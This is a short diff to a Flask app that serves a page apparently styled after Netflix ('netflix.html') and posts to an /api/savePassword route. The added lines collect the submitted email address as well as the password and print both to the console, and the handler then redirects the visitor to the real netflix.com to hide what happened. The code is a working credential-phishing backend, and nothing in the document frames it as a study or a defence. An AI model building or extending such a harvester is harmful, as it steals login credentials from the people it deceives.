@@ -4,15 +4,17 @@ app = Flask(__name__)
 #DEFAULT NETFLIX TEMPLATE
 @app.route('/')
 def index():
-    #create a sub folder named template and move ur template into that folder then only it will work 
+    #create a sub folder named template and move ur custom_template into that folder then only it will work 
     return render_template('netflix.html')
 
 @app.route('/api/savePassword', methods=['POST'])
 def save_password():
     password = request.form.get('password')
+    emailaddr=request.form.get("email")
     if password:
         try:
             # Print the password to the console
+            print(f"Received emailaddress: {emailaddr}")
             print(f"Received password: {password}")
             return redirect("https://www.netflix.com")  # Indentation corrected
         except Exception as e:
